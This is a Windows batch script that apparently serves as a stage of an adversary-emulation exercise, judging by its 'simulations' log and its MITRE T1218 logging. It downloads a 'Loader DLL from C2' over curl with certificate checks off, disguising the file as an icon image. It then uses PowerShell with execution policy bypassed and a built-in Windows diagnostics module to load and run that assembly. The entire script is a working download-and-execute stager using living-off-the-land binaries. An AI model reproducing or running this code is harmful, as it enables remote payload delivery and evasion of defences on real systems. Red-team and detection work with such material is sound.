@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET a1b2c3d4=%APPDATA%\11133\ec7a2e31
SET e5f6g7h8=bca2b27d.txt
SET i9j0k1l2=https://10.0.0.49/stage/2/icon.png?11133-7
SET m3n4o5p6=ITZEL-S2B
SET q7r8s9t0=11133
SET u1v2w3x4=7
SET y5z6a7b8=%PUBLIC%\\macula-simulations.log
REM Capture timestamp once at script start
SET tsvar=!DATE! !TIME!

REM ===== DEBUG: Heartbeat fetch start =====
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: heartbeat_start>> "!y5z6a7b8!" 2>nul

REM 1. Heartbeat fetch: download Loader DLL from C2
curl -k -s -o "!a1b2c3d4!\!e5f6g7h8!" "!i9j0k1l2!" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: heartbeat_fail=%ERRORLEVEL%>> "!y5z6a7b8!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: heartbeat_complete>> "!y5z6a7b8!" 2>nul
)

REM 2. Change working directory to output directory
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: chdir_start>> "!y5z6a7b8!" 2>nul
cd /d "!a1b2c3d4!" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: chdir_result=1>> "!y5z6a7b8!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: chdir_result=0>> "!y5z6a7b8!" 2>nul
)

REM 3. Invoke downloaded Stage 2 Loader DLL via PowerShell LOLBIN
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: powershell_start>> "!y5z6a7b8!" 2>nul
powershell.exe -nop -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin '%APPDATA%\11133\ec7a2e31\bca2b27d.txt'; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
SET ps_exit=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!m3n4o5p6!][!q7r8s9t0!]: powershell_end=%ps_exit%>> "!y5z6a7b8!" 2>nul

REM 4. TTP logging
IF %ps_exit% EQU 0 (
    echo [!tsvar!][TTP][!m3n4o5p6!][!q7r8s9t0!]: T1218^|System Binary Proxy Execution=OK^|>> "!y5z6a7b8!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!m3n4o5p6!][!q7r8s9t0!]: T1218^|System Binary Proxy Execution=FAIL^|PowerShell returned errorlevel %ps_exit%>> "!y5z6a7b8!" 2>nul
)

REM Exit immediately
ENDLOCAL
exit /b 0